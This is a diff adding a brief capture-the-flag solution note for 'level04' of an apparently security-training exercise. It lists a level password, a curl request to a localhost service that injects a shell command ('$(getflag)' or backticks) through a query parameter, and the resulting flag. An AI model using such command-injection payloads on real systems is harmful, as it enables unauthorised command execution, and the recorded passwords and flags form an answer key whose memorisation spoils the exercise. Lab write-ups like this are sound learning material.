@@ -1,0 +1,5 @@
+level04 : qi0maab88jeaj46qoumi7maus
+Process :
+    - cat level04.pl
+    - Launch curl 'http://localhost:4747/?x=$(getflag)' or curl 'http://localhost:4747/?x=`getflag`'
+    - Get the flag = ne2searoevaevoem4ov4ar8ap
